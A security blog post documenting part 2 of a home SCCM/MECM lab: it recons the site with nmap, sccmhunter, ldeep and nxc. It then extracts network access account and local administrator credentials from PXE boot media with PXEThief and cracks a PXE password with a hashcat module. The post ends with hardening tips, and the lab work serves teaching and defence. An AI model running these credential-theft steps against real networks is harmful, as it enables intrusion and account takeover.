---
layout: post
title:  Active Directory MECM LAB - Part 2
categories : [Active Directory]
tags : [ AD, SCCM, PXE, Hacking, ConfigMgr ]
enable_toc: true
render_with_liquid: true
date: 2024-03-28 00:00:00 +0530
---

![figure1]({{site.url}}/assets/img/SCCMLAB.png)

On the previous post ([SCCM LAB part 1]({% link _posts/2024-03-23-SCCM-LAB-part-1.md %})) we setup an environment  to test SCCM vulnerabilities.

![vmware_ready.png](/assets/img/vmware_ready.png)

# Recon

## Recon without user

- scan with nmap (full port list used here : [https://learn.microsoft.com/en-us/mem/configmgr/core/plan-design/hierarchy/ports](https://learn.microsoft.com/en-us/mem/configmgr/core/plan-design/hierarchy/ports))

```bash
# search sccm
nmap -p 80,443,445,1433,10123,8530,8531 -sV 192.168.33.11-12
# search pxe
nmap -p 67,68,69,4011,547 -sU 192.168.33.11 
```

![tcp_scan.png](/assets/img/tcp_scan.png)
![udp_scan.png](/assets/img/udp_scan.png)

- let see the certificate on port 10123

```bash
openssl s_client -connect 192.168.33.11:10123
```

![self_certificate_SMS.png](/assets/img/self_certificate_SMS.png)

- and the self-signed certificate common name is SMS :)

- let see now the rpc protocols
```bash
rpcdump.py 192.168.33.11 |grep Protocol |grep -v 'N/A'
```

- The "Windows Deployment Services Control Protocol" is present which is implied the use of a WDS Server.

![wdsc_rpc.png](/assets/img/wdsc_rpc.png)

## Recon with user

> Let's use a low privilege user sccm.lab/carol:SCCMftw

### Recon with LDAP

```bash
python3 sccmhunter.py find -u carol -p SCCMftw -d sccm.lab -dc-ip 192.168.33.10 -debug
```

![sccm_hunter.png](/assets/img/sccm_hunter.png)

```bash
ldeep ldap -u carol -p SCCMftw -d SCCM.lab -s ldap://192.168.33.10 sccm
```
![recon_ldeep.png](/assets/img/recon_ldeep.png)

```bash
ldeep ldap -u carol -p SCCMftw -d SCCM.lab -s ldap://192.168.33.10 search "(objectclass=mssmsmanagementpoint)" dnshostname,msSMSSiteCode
```
![recon_ldeep2.png](/assets/img/recon_ldeep2.png)

### Recon with SMB shares

```bash
nxc smb 192.168.33.11 -u carol -p SCCMftw -d SCCM.lab --shares
```

![recon_shares_smb.png](/assets/img/recon_shares_smb.png)

- with sccm hunter

```bash
python3 sccmhunter.py smb -u carol -p 'SCCMftw' -d sccm.lab -dc-ip 192.168.33.10 -debug
```

![recon_shares_smb_sccmhunter.png](/assets/img/recon_shares_smb_sccmhunter.png)

### Show sccm hunter results

```bash
python3 sccmhunter.py show -all
```

![sccm_hunter_show_all.png](/assets/img/sccm_hunter_show_all.png)


# PXE

## PXE - create computer - standard way
- First thing first, we will start by trying if the pxe feature works well.
- create a new virtual machine with no operating system

![pxe_step1.png](/assets/img/pxe_step1.png)

- Edit the virtual machine settings and setup the same virtual network of the SCCM lab.

![pxe_step2.png](/assets/img/pxe_step2.png)

- go to advanced option and choose boot type : BIOS (because the UEFI wasn't configured in the lab)

![pxe_step3.png](/assets/img/pxe_step3.png)

- Save and start the machine

> Examples are on vmware but it is almost the same on virtualbox.

- during the boot you should see this:

![pxe_networkboot.png](/assets/img/pxe_networkboot.png)

- Press F12 and if all goes well you should see:

![pxe_loading.png](/assets/img/pxe_loading.png)

- and a bit later the PXE Boot menu:

![pxe_boot.png](/assets/img/pxe_boot.png)

- on the lab by default the PXE is setup with no password so you can click next

![pxe_start_install.png](/assets/img/pxe_start_install.png)

- And the windows installation will start
- At the end you will have

![pxe_install_finish.png](/assets/img/pxe_install_finish.png)

- next "continue with limited setup"

- And you get a windows 10 vm prompt

![pxe_install_finish_prompt.png](/assets/img/pxe_install_finish_prompt.png)

- In the lab the disk is not ciphered so we can boot on a live cd, open the windows disk and get the sam, system and security files to get the default administrator hash.

## Exploit PXE - no password

- A description [Cred-1](https://github.com/subat0mik/Misconfiguration-Manager/blob/main/attack-techniques/CRED/CRED-1/cred-1_description.md#cred-1)

- Get information with [pxethief](https://github.com/MWR-CyberSec/PXEThief)

```bash
python3 pxethief.py 2 192.168.33.11
```

![pxethief_run.png](/assets/img/pxethief_run.png)

- We get a lot of information but we are unable to decrypt the password from a non windows machine

- Ok so let's start again from a windows machine
- install :
    - python3 (tested ok on python 3.10)
    - obviously clone the project [https://github.com/MWR-CyberSec/PXEThief](https://github.com/MWR-CyberSec/PXEThief)
    - install pxethief requirements.txt (`py.exe -m pip install -r requirements.txt`)
    - install npcap (https://npcap.com/#download))
    - install tftp client (windows > Turn windows feature on or off > check tftp client)
    - disable your firewall (or enable tftp in it)
    - launch!

```powershell
py.exe pxethief.py 2 192.168.33.11
```

![pxethief_windows_capture_1_2.png](/assets/img/pxethief_windows_capture_1_2.png)
![pxethief_windows_capture_2_2.png](/assets/img/pxethief_windows_capture_2_2.png)

- we get the network access account (NAA) in clear text, and we also get the new computer administrator account setup in pxe.

- Let's try the NAA account on the network

```bash
nxc smb 192.168.33.10-13 -u sccm-naa -d sccm.lab -p 123456789
```

![naa_nxc.png](/assets/img/naa_nxc.png)

- And the administrator account found

```bash
nxc smb 192.168.33.10-13 -u administrator -p 'EP+xh7Rk6j90' --local-auth
```

![nxc_localadmin.png](/assets/img/nxc_localadmin.png)

- We have a domain account and we also got a local admin account on CLIENT$ due to password reuse.

## Exploit PXE - with password

- let's try a PXE with password
- In order to add a password we will have to modify the distribution point configuration.
- Go to the management console on the MECM computer (creds: dave/dragon)
- And right click on the distribution point to select the properties

![admin_distribution_point.png](/assets/img/admin_distribution_point.png)

- In the PXE tab select require a password and enter a password for pxe (password: "hello")

![set_pxe_password.png](/assets/img/set_pxe_password.png)

- Select apply, Wait a few minutes for the deployment propagation

- Now if we retry from windows we get an error as a password is detected:

```powershell
py.exe pxethief.py 2 192.168.33.11
```

![pxe_thief_with_password.png](/assets/img/pxe_thief_with_password.png)

- Let's download the file and print the hash with pxethief

```powershell
tftp -i 192.168.33.11 GET "\SMSTemp\2024.03.28.03.27.34.0001.{BC3AEB9D-2A6C-46FB-A13E-A5EEF11ABACD}.boot.var" "2024.03.28.03.27.34.0001.{BC3AEB9D-2A6C-46FB-A13E-A5EEF11ABACD}.boot.var"
py.exe pxethief.py 5 '.\2024.03.28.03.27.34.0001.{BC3AEB9D-2A6C-46FB-A13E-A5EEF11ABACD}.boot.var'
```

![pxe_gethash.png](/assets/img/pxe_gethash.png)

- and crack it with the hashcat module [https://github.com/MWR-CyberSec/configmgr-cryptderivekey-hashcat-module](https://github.com/MWR-CyberSec/configmgr-cryptderivekey-hashcat-module)

- on exegol with hashcat 6.2.5

```bash
cd /workspace
git clone https://github.com/hashcat/hashcat.git
git clone https://github.com/MWR-CyberSec/configmgr-cryptderivekey-hashcat-module
cp configmgr-cryptderivekey-hashcat-module/module_code/module_19850.c hashcat/src/modules/
cp configmgr-cryptderivekey-hashcat-module/opencl_code/m19850* hashcat/OpenCL/
cd hashcat
# change to 6.2.5
git checkout -b v6.2.5 tags/v6.2.5
make
```
- crack the hash

```bash
cd /workspace
hashcat/hashcat -m 19850 --force -a 0 /workspace/pxe_hash /usr/share/wordlists/rockyou.txt
```

![pxe_hash_cracked.png](/assets/img/pxe_hash_cracked.png)

- we successfully retrieved the password: hello

- Now we can use it on pxethief and get the same creds as before

```powershell
py.exe pxethief.py 3 ".\2024.03.28.03.27.34.0001.{BC3AEB9D-2A6C-46FB-A13E-A5EEF11ABACD}.boot.var" hello
```

![pxe_creds_with_password.png](/assets/img/pxe_creds_with_password.png)

> How to Secure this ?
> - use a strong password for pxe
> - do not use default administrator creds on image creation
> - enable bitlocker on pxe options
> - consider using a dedicated vlan for pxe boot
{: .prompt-tip }

